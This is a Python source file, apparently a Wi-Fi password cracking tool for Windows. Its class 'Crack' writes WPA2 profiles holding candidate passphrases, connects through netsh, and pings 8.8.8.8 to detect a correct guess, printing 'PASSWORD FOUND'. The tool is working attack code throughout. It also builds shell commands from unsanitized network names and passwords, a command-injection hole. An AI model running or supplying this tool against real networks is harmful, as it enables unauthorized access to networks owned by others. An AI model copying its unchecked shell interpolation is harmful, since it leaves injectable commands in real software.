import os
import re
import time
import subprocess

C = '\033[36m'  # cyan
G = '\033[32m'  # green
W = '\033[0m'  # white
R = '\033[31m'  # red


class Crack():
    @staticmethod
    def connect(name, password):
        os.system(f"netsh wlan connect name={name} ssid={name} interface=Wi-Fi > .connect ")

        # update the user about the progress
        print(C + " > Trying " + W + password)
        time.sleep(3)

        # testing the connection
        os.system("ping 8.8.8.8 -n 1 > .ping.txt")
        with open(".ping.txt", "r") as f:

            # check request result
            f = f.read()
            if "Destination host unreachable" in f \
                    or "transmit failed" in f \
                    or "General failure" in f \
                    or "100% loss" in f:
                print(R + "[*] No Connection")
            else:
                state = True
                print(G + "\n[*] PASSWORD FOUND ! ")
                print(G+"[*] The Password for " + W + name + G+' is: ' + W + password)
                return state

    @staticmethod
    def show_available_networks():
        # prints output to the user
        os.system("""netsh wlan show networks interface=Wi-Fi | find "SSID" """)


def createprofile(name, password):
    config = """<?xml version=\"1.0\"?>
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
            <name>""" + name + """</name>
            <SSIDConfig>
                <SSID>
                    <name>""" + name + """</name>
                </SSID>
            </SSIDConfig>
            <connectionType>ESS</connectionType>
            <connectionMode>auto</connectionMode>
            <MSM>
                <security>
                    <authEncryption>
                        <authentication>WPA2PSK</authentication>
                        <encryption>AES</encryption>
                        <useOneX>false</useOneX>
                    </authEncryption>
                    <sharedKey>
                        <keyType>passPhrase</keyType>
                        <protected>false</protected>
                        <keyMaterial>""" + password + """</keyMaterial>
                    </sharedKey>
                </security>
            </MSM>
        </WLANProfile>"""
    command = f"netsh wlan add profile filename={name}.xml interface=Wi-Fi > .creatxml"
    with open(name + ".xml", 'w') as file:
        file.write(config)
    os.system(command)
    os.system(f"del {name}.xml")
